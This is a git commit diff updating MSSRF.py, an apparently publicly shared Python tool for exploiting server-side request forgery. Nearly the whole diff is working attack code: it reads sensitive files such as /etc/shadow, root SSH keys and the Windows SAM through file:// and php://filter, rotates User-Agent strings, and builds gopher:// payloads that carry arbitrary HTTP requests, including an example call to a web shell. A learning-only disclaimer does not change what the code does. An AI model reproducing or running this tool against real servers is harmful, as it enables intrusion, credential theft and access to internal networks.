cfad81f353646f06a88390462e0b71e025f8daad
MartinxMax <280901844@qq.com>
2023-04-09 17:26:05 +0800

    Update

--- MSSRF.py
+++ MSSRF.py
@@ -1,16 +1,16 @@
 #!/usr/bin/python3
 # @Мартин.
-import sys,argparse,textwrap,requests,re,random,os
+import sys, argparse, textwrap, requests, re, random, os
 from loguru import logger
 import urllib.parse
 
-Version = "@Мартин. SSRF Tool V1.1.0"
-Title='''
+Version = "@Мартин. SSRF Tool V1.1.2"
+Title = '''
 ************************************************************************************
 <免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
 <Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
 ************************************************************************************'''
-Logo=f'''
+Logo = f'''
  ███▄ ▄███▓     ██████      ██████     ██▀███       █████▒
 ▓██▒▀█▀ ██▒   ▒██    ▒    ▒██    ▒    ▓██ ▒ ██▒   ▓██   ▒ 
 ▓██    ▓██░   ░ ▓██▄      ░ ▓██▄      ▓██ ░▄█ ▒   ▒████ ░ 
@@ -20,7 +20,7 @@ Logo=f'''
 ░  ░      ░   ░ ░▒  ░ ░   ░ ░▒  ░ ░     ░▒ ░ ▒░    ░      
 ░      ░      ░  ░  ░     ░  ░  ░       ░░   ░     ░ ░    
        ░            ░           ░        ░                
-                                                          
+
                 Github==>https://github.com/MartinxMax    
                 {Version}  '''
 
@@ -35,50 +35,62 @@ def Init_Loger():
 
 
 class Main_Class():
-    def __init__(self,args):
-        self.URL=args.URL
-        self.INFO= args.INFO
-        self.EXP=args.EXP
+    def __init__(self, args):
+        self.URL = args.URL
+        self.INFO = args.INFO
+        self.EXP = args.EXP
         self.TYPE = args.TYPE
         self.Linux_DIR = ["/root/.ssh/authorized_keys", "/root/.ssh/id_rsa", "/root/.ssh/id_ras.keystore",
-                 "/root/.ssh/known_hosts", "/etc/passwd", "/etc/shadow", "/etc/my.cnf", "/etc/httpd/conf/httpd.conf",
-                 "/root/.bash_history", "/root/.mysql_history", "/proc/mounts", "/porc/config.gz",
-                 "/var/lib/mlocate/mlocate.db", "/porc/self/cmdline","/flag","/etc/flag","/var/www/html/flag.php","/tmp/flag.php"]
+                          "/root/.ssh/known_hosts", "/etc/passwd", "/etc/shadow", "/etc/my.cnf",
+                          "/etc/httpd/conf/httpd.conf",
+                          "/root/.bash_history", "/root/.mysql_history", "/proc/mounts", "/porc/config.gz",
+                          "/var/lib/mlocate/mlocate.db", "/porc/self/cmdline", "/flag", "/etc/flag",
+                          "/var/www/html/flag.php", "/tmp/flag.php"]
         self.Windows_DIR = ["C:\\boot.ini", "C:\\Windows\\System32\\inetsrv\\MetaBase.xml", "C:\\Windows\\repair\\sam",
-                   "C:\\Program Files\mysql\\my.ini", "C:\\Program Files\\mysql\\data\\mysql\\user.MYD", "C:\\Windows\\php.ini",
-                   "C:\\Windows\\my.ini", "C:\\Windows\\win.ini"]
-        self.User_Agents =[
-                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
-                'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
-                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
-                'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1'
-            ]
-
-
+                            "C:\\Program Files\mysql\\my.ini", "C:\\Program Files\\mysql\\data\\mysql\\user.MYD",
+                            "C:\\Windows\\php.ini",
+                            "C:\\Windows\\my.ini", "C:\\Windows\\win.ini"]
+        self.User_Agents = [
+            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
+            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
+            'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1'
+        ]
+        self.info = '''
+We have detected that you are attempting to have the server send a get request. If the utilization fails, please try modifying the message in the Requestconf file and deleting the parameters in the message line by line. Test:
+Example: [(Keep at least two lines)
+GET /xinan/public/shell.php? cmd=ls HTTP/1.1
+Host: 127.0.0.1:80
+]  
+                '''
     def run(self):
         if self.URL and "*" in self.URL:
-            self.Domain = re.search(r'(?<=//)[^/]+', self.URL).group().replace(':','_')
+            self.Loading_Payload()
+            if 'http://' not in self.URL.lower():
+                self.URL = 'http://' + self.URL
+            self.Domain = re.search(r'(?<=//)[^/]+', self.URL).group().replace(':', '_')
             if self.INFO:
-                self.Server_Types=self.Server_Type()
+                self.Server_Types = self.Server_Type()
                 logger.info("Test File Protocol...")
-                self.Server_Info(self.Server_Types,Protocol="file://")
+                self.Server_Info(self.Server_Types, Protocol="file://")
                 logger.info("Test PHP Protocol...")
                 self.Server_Info(self.Server_Types, Protocol="php://filter/read=convert.base64-encode/resource=")
                 logger.warning("Test completed")
             if self.EXP:
+                if 'get' in self.note.lower():
+                    logger.warning(self.info)
                 self.Send_Payload(self.Build_Payload())
         else:
             logger.error("You must fill in the correct parameters")
 
-
     def Server_Type(self):
-        if 'win' in self.TYPE.lower() :
+        if 'win' in self.TYPE.lower():
             logger.warning("You force the specified server to be a Windows operating system")
             return 0
         elif 'lin' in self.TYPE.lower():
@@ -86,7 +98,8 @@ class Main_Class():
             return 1
         logger.info("Detecting server type...")
         try:
-            response = requests.get(self.URL.split('?')[0], headers={'User-Agent': random.choice(self.User_Agents)},timeout=5)
+            response = requests.get(self.URL.split('?')[0], headers={'User-Agent': random.choice(self.User_Agents)},
+                                    timeout=5)
         except:
             logger.error("There is a problem with the network")
             return False
@@ -104,9 +117,8 @@ class Main_Class():
                 logger.error("[Request exception]")
                 return False
 
-
-    def Server_Info(self, Flag=False,Protocol=None):
-        if not self.Get_Error_Page_Lenght(Protocol) :
+    def Server_Info(self, Flag=False, Protocol=None):
+        if not self.Get_Error_Page_Lenght(Protocol):
             return False
         else:
             if Flag == 0:
@@ -130,63 +142,65 @@ class Main_Class():
                     else:
                         logger.error(f"No sensitive files were found on this server [{DIR}]")
 
-
-
-    def Get_Error_Page_Lenght(self,Protocol):
+    def Get_Error_Page_Lenght(self, Protocol):
         try:
-            result = requests.get(self.URL.replace("*", Protocol+"Martin"), timeout=2,headers={'User-Agent': random.choice(self.User_Agents)})
+            result = requests.get(self.URL.replace("*", Protocol + "Martin"), timeout=2,
+                                  headers={'User-Agent': random.choice(self.User_Agents)})
         except:
             logger.error("Unable to get error page length")
             return False
         else:
             if result.status_code == 200:
-                self.Page_Lenght=len(result.text)
+                self.Page_Lenght = len(result.text)
                 logger.warning(f"[Error Page Lenght] [{self.Page_Lenght}]")
                 return True
             else:
                 logger.error("The request cannot reach the server, unable to obtain the page length")
 
 
-    def Build_Payload(self):
+    def Loading_Payload(self):
         logger.info("PAYLOAD Loading ...")
         try:
-            with open('Request.conf','r+',encoding='utf-8')as f:
-                note = f.read()
+            with open('Request.conf', 'r+', encoding='utf-8') as f:
+                self.note = f.read()
         except:
             logger.error("Unable to find Request.conf file")
             return False
         else:
-            if not note:
+            if not self.note:
                 logger.error("Unable to load PAYLOAD")
-                return None
+                return False
             else:
                 logger.warning("PAYLOAD loaded successfully")
-                Head_PAYLOAD = urllib.parse.quote(note).replace("%0A", "%0D%0A")
-                Host = re.search(r'^Host:\s*(.*?)$', note,re.MULTILINE).group(1)
-                PAYLOAD = "gopher://"+Host+"/_"+urllib.parse.quote(Head_PAYLOAD)
-                return PAYLOAD
+                return True
 
 
-    def Send_Payload(self,payload=None):
+    def Build_Payload(self):
+        Head_PAYLOAD = urllib.parse.quote(self.note).replace("%0A", "%0D%0A")
+        Host = re.search(r'^Host:\s*(.*?)$', self.note, re.MULTILINE).group(1)
+        PAYLOAD = "gopher://" + Host + "/_" + urllib.parse.quote(Head_PAYLOAD)
+        return PAYLOAD
+
+    def Send_Payload(self, payload=None):
         if payload:
-            logger.warning("\n[PAYLOAD]\n" +self.URL.replace("*", payload))
+            logger.warning("\n[PAYLOAD]\n" + self.URL.replace("*", payload))
             logger.info("[Try SSRF...]")
             try:
-                status = requests.get(self.URL.replace("*", payload),headers={'User-Agent': random.choice(self.User_Agents)},timeout=10)
+                status = requests.get(self.URL.replace("*", payload),
+                                      headers={'User-Agent': random.choice(self.User_Agents)}, timeout=10)
             except:
                 logger.error("Problems with SSRF!")
                 return False
             else:
                 if status.text:
-                    logger.warning(f"\n[SSRF_RESULT] [Request_Status_Code:{status.status_code}]\n"+status.text)
+                    logger.warning(f"\n[SSRF_RESULT] [Request_Status_Code:{status.status_code}]\n" + status.text)
                 else:
                     logger.error("The exploit seems to have failed")
                 return True
         else:
             return False
 
-
-    def Save_Log(self,path,data):
+    def Save_Log(self, path, data):
         dir_name = os.path.dirname(path)
         file_name = os.path.basename(path)
         if not os.path.exists(dir_name):
@@ -201,7 +215,7 @@ class Main_Class():
 
 
 def main():
-    print(Logo,"\n",Title)
+    print(Logo, "\n", Title)
     Init_Loger()
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawTextHelpFormatter,
@@ -212,11 +226,11 @@ def main():
             python3 {MPHP} -url http://xxx.com?a=* -exp #Conduct an attack
             python3 {MPHP} -url http://xxx.com?a=* -info # Server sensitive information collection
             python3 {MPHP} -url http://xxx.com?a=* -info -type(windows) #Specify the host operating system
-            
-            '''.format(MPHP = sys.argv[0]
-                )))
-    parser.add_argument('-url', '--URL',default='', help='Target_URL')
-    parser.add_argument('-info', '--INFO',action='store_true', help='Server_INFO')
+
+            '''.format(MPHP=sys.argv[0]
+                       )))
+    parser.add_argument('-url', '--URL', default='', help='Target_URL')
+    parser.add_argument('-info', '--INFO', action='store_true', help='Server_INFO')
     parser.add_argument('-type', '--TYPE', default='', help='Server_Type')
     parser.add_argument('-exp', '--EXP', action='store_true', help='Exploit')
     args = parser.parse_args()
